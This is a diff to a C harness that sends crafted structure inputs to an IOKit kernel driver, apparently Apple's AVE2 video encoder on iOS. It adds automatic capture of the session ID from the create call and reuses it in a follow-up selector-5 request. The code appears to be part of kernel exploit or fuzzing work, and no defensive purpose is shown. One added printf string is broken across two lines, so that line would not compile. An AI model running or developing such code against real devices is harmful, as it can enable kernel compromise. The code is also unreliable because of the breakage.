@@ -54,6 +54,7 @@ static uint8_t  anon_in[0x1a0c0];
 static uint8_t  in[0x6f0];
 static uint8_t  out[0x400];
 static int g_opentype = 1;
+static uint32_t g_create_sid = 0;   /* w61: create out[0] snapshot for sel5 auto-SID */
 static uint64_t counter = 0x0000700000004005ULL;
 static void apply_patch(uint8_t *buf, const char *spec); /* fwd: used by create_session */
 static io_service_t svc;
@@ -112,6 +113,7 @@ static kern_return_t create_session(int mode, io_connect_t *conn) {
     size_t osz = AVE2_IOS_CREATE_OUT_SIZE;
     memset(out, 0, sizeof(out));
     kern_return_t k1 = p_IOConnectCallStructMethod(*conn, 1, in, AVE2_IOS_CREATE_IN_SIZE, out, &osz);
+    if (osz >= 4) g_create_sid = *(uint32_t *)out;
     printf("    create m%d -> 0x%08x\n", mode, k1);
     if (k1 == 0) { printf("    create out:"); for (int q=0;q<8;q++) printf(" %08x", *(uint32_t*)(out+4*q)); printf("\n"); }
     return k1;
@@ -474,8 +476,9 @@ int main(void) {
             uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5));
             *(uint32_t *)(d5 + 0x04) = 5;
             *(uint32_t *)(d5 + 0x10) = 1;
-            const char *sv5 = getenv("AVE2_S5SID");
-            *(uint32_t *)(d5 + 0x28) = sv5 ? (uint32_t)strtoul(sv5,0,0) : 1;
+            const char *sv5 = getenv("AVE2_S5SID"); uint32_t sid_auto = (sv5 && strcmp(sv5,"auto")==0) ? g_create_sid : (sv5 ? (uint32_t)strtoul(sv5,0,0) : 1);
+            *(uint32_t *)(d5 + 0x28) = sid_auto; printf("    [sid] using 0x%x
+", sid_auto);
             memcpy(d5 + 0x30, stat_in, 0x1a080);
             uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
             kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
